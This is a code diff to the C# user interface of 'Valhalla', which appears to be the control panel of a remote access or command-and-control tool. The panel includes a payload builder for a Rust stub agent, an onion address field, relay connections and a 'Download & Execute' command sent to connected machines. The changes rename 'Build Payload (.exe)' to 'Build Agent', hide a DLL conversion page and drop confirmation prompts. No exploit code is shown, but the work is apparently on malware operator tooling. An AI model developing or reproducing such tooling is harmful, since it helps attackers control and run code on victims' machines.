@@ -66,7 +66,7 @@ namespace Valhalla
         private DevExpress.XtraBars.BarButtonItem connectionsCloseItem;
         private DevExpress.XtraBars.BarButtonItem connectionsDirectConnectItem;
         private DevExpress.XtraBars.BarButtonItem connectionsDirectDisconnectItem;
-        private DevExpress.XtraBars.BarButtonItem connectionsRefreshTelemetryItem;
+
         private DevExpress.XtraBars.BarButtonItem connectionsBlockItem;
         private DevExpress.XtraBars.BarButtonItem connectionsExecuteItem;
         private DevExpress.XtraBars.BarButtonItem connectionsDownloadUpdateItem;
@@ -146,9 +146,9 @@ namespace Valhalla
         private DevExpress.XtraGrid.GridControl pluginManagerGrid;
         private DevExpress.XtraGrid.Views.Grid.GridView pluginManagerGridView;
         private DataTable pluginManagerTable;
-        private ContextMenuStrip pluginManagerContextMenu;
-        private ToolStripMenuItem pluginLoadItem;
-        private ToolStripMenuItem pluginUnloadItem;
+        private DevExpress.XtraBars.PopupMenu pluginManagerPopupMenu;
+        private DevExpress.XtraBars.BarButtonItem pluginLoadItem;
+        private DevExpress.XtraBars.BarButtonItem pluginUnloadItem;
         private readonly Dictionary<string, PendingCommand> pendingCommands = new Dictionary<string, PendingCommand>(StringComparer.Ordinal);
         // Stores the ACK/ERR outcome (true=ACK, false=ERR) for file-delivery commands
         // so the file-command dialog can poll and display per-connection results.
@@ -3642,6 +3642,17 @@ namespace Valhalla
             textEdit3.Visible  = false;
             OpenFileDialogIcon = string.Empty;
 
+            // Rename the builder page header label from legacy "Build Payload (.exe)" to current purpose.
+            label52.Text = "Build Agent";
+
+            // Rename the sidebar navigation item to reflect current purpose.
+            accordionControlElement6.Text = "Build Agent";
+
+            // Hide the legacy "Convert To (.dll)" sidebar entry and its tab page — these
+            // are not applicable to the Rust stub-based agent build workflow.
+            accordionControlElement7.Visible = false;
+            xtraTabPage6.PageVisible        = false;
+
             // Configure the existing onion address field.
             label54.Text = "Onion Address";
             textEdit4.Properties.AllowFocused = true;
@@ -4446,17 +4457,37 @@ namespace Valhalla
             pluginManagerGridView.Columns["Server"].Width = 270;
             pluginManagerGridView.Columns["Client"].Width = 270;
             pluginManagerGridView.Columns["Status"].Width = 110;
-            pluginManagerContextMenu = new ContextMenuStrip { ShowImageMargin = false, ShowCheckMargin = false };
-            pluginLoadItem = new ToolStripMenuItem("Load Plugin");
-            pluginUnloadItem = new ToolStripMenuItem("Unload Plugin");
-            pluginLoadItem.Click += delegate { LoadPluginFromDialog(); };
-            pluginUnloadItem.Click += delegate { UnloadSelectedPlugin(); };
-            pluginManagerContextMenu.Items.Add(pluginLoadItem);
-            pluginManagerContextMenu.Items.Add(pluginUnloadItem);
-            pluginManagerGrid.ContextMenuStrip = pluginManagerContextMenu;
+            pluginManagerPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
+            {
+                Name = "pluginManagerPopupMenu",
+                MinWidth = ContextParentMenuWidth
+            };
+            pluginLoadItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Load Plugin")
+            {
+                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
+            };
+            pluginUnloadItem = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, "Unload Plugin")
+            {
+                PaintStyle = DevExpress.XtraBars.BarItemPaintStyle.Caption
+            };
+            pluginLoadItem.ImageOptions.Image = null;
+            pluginLoadItem.ImageOptions.SvgImage = null;
+            pluginUnloadItem.ImageOptions.Image = null;
+            pluginUnloadItem.ImageOptions.SvgImage = null;
+            pluginLoadItem.ItemClick += delegate { LoadPluginFromDialog(); };
+            pluginUnloadItem.ItemClick += delegate { UnloadSelectedPlugin(); };
+            pluginManagerPopupMenu.AddItem(pluginLoadItem);
+            pluginManagerPopupMenu.AddItem(pluginUnloadItem);
             pluginManagerGrid.MouseDoubleClick += delegate { StartSelectedPlugin(); };
             pluginManagerGrid.KeyDown += delegate(object sender, KeyEventArgs e) { if (e.KeyCode == Keys.Enter) { e.Handled = true; StartSelectedPlugin(); } };
-            pluginManagerContextMenu.Opening += delegate { pluginUnloadItem.Enabled = GetSelectedPluginName() != null; };
+            pluginManagerGrid.MouseUp += delegate(object sender, MouseEventArgs e)
+            {
+                if (e.Button == MouseButtons.Right && pluginManagerPopupMenu != null)
+                {
+                    pluginUnloadItem.Enabled = GetSelectedPluginName() != null;
+                    pluginManagerPopupMenu.ShowPopup(Control.MousePosition);
+                }
+            };
             pluginManagerTabPage.Controls.Add(pluginManagerGrid);
             RefreshPluginManagerGrid();
         }
@@ -5493,7 +5524,7 @@ namespace Valhalla
             else if (e.Page == blockedConnectionsTabPage) item = blockedConnectionsNavigationElement;
             else if (e.Page == xtraTabPage4) item = null;
             else if (e.Page == xtraTabPage5) item = accordionControlElement6;
-            else if (e.Page == xtraTabPage6) item = accordionControlElement7;
+            else if (e.Page == xtraTabPage6) item = accordionControlElement6; // legacy page hidden; keep sidebar consistent
             else if (e.Page == xtraTabPage9) item = accordionControlElement13;
             if (item != null) accordionControl1.SelectedElement = item;
         }
@@ -5569,7 +5600,7 @@ namespace Valhalla
             DisposeConnectionMenuIcons();
 
             connectionsAdministrationMenu = CreateConnectionMenuGroup("Administration", "menu_administration.svg");
-            connectionsExecuteItem = CreateConnectionMenuItem("Download [ One ]", delegate { ShowRemoteExecutionDialog(); });
+            connectionsExecuteItem = CreateConnectionMenuItem("Download & Execute", delegate { ShowRemoteExecutionDialog(); });
             connectionsDownloadUpdateItem = CreateConnectionMenuItem("Download and Update", delegate { ShowRemoteUpdateDialog(); });
             connectionsAdministrationMenu.AddItem(connectionsExecuteItem);
             connectionsAdministrationMenu.AddItem(connectionsDownloadUpdateItem);
@@ -5577,21 +5608,17 @@ namespace Valhalla
             connectionsNetworkingMenu = CreateConnectionMenuGroup("Networking", "menu_networking.svg");
             connectionsDirectConnectItem = CreateConnectionMenuItem("Direct Connect", delegate { SendSelectedDirectTransition("DIRECT_CONNECT"); });
             connectionsDirectDisconnectItem = CreateConnectionMenuItem("Direct Disconnect", delegate { SendSelectedDirectTransition("DIRECT_DISCONNECT"); });
-            connectionsRefreshTelemetryItem = CreateConnectionMenuItem("Refresh Telemetry", delegate { RefreshSelectedRelayTelemetry(); });
             connectionsNetworkingMenu.AddItem(connectionsDirectConnectItem);
             connectionsNetworkingMenu.AddItem(connectionsDirectDisconnectItem);
-            connectionsNetworkingMenu.AddItem(connectionsRefreshTelemetryItem);
             connectionsNetworkingMenu.AddItem(CreateConnectionMenuItem("Restart Connection", delegate {
-                if (ShowConnectionConfirmation("Restart Connection"))
-                    SendSelectedConnectionCommand("RECONNECT");
+                SendSelectedConnectionCommand("RECONNECT");
             }));
             connectionsCloseItem = CreateConnectionMenuItem("Close Connection", delegate {
                 if (ShowConnectionConfirmation("Close Connection"))
                     SendSelectedConnectionCommand("CLOSE");
             });
             connectionsBlockItem = CreateConnectionMenuItem("Block Connection", delegate {
-                if (ShowConnectionConfirmation("Block Connection"))
-                    BlockSelectedConnections();
+                BlockSelectedConnections();
             });
             connectionsNetworkingMenu.AddItem(connectionsCloseItem);
             connectionsNetworkingMenu.AddItem(connectionsBlockItem);
@@ -6649,7 +6676,7 @@ namespace Valhalla
             bool relayConnected = relayGatewayClient != null && relayGatewayClient.IsConnected;
             if (connectionsDirectConnectItem != null) connectionsDirectConnectItem.Enabled = relayConnected && hasRelay && !transitionPending;
             if (connectionsDirectDisconnectItem != null) connectionsDirectDisconnectItem.Enabled = relayConnected && hasRelay && !transitionPending;
-            if (connectionsRefreshTelemetryItem != null) connectionsRefreshTelemetryItem.Enabled = relayConnected && hasRelay;
+
 
             // The visible menu contains only the four requested top-level submenus.
             // The popup performs native measurement, hover rendering and submenu traversal.
@@ -6690,19 +6717,21 @@ namespace Valhalla
 
         private void accordionControlElement6_Click(object sender, EventArgs e)
         {
-            xtraTabPage1.TabControl.SelectedTabPageIndex = 4;
+            xtraTabControl1.SelectedTabPage = xtraTabPage5;
             accordionControl1.SelectedElement = accordionControlElement6;
         }
 
         private void accordionControlElement7_Click(object sender, EventArgs e)
         {
-            xtraTabPage1.TabControl.SelectedTabPageIndex = 5;
-            accordionControl1.SelectedElement = accordionControlElement7;
+            // Legacy "Convert To (.dll)" page is no longer available.
+            // Redirect to the agent builder page.
+            xtraTabControl1.SelectedTabPage = xtraTabPage5;
+            accordionControl1.SelectedElement = accordionControlElement6;
         }
 
         private void accordionControlElement13_Click(object sender, EventArgs e)
         {
-            xtraTabPage1.TabControl.SelectedTabPageIndex = 8;
+            xtraTabControl1.SelectedTabPage = xtraTabPage9;
             accordionControl1.SelectedElement = accordionControlElement13;
         }
 
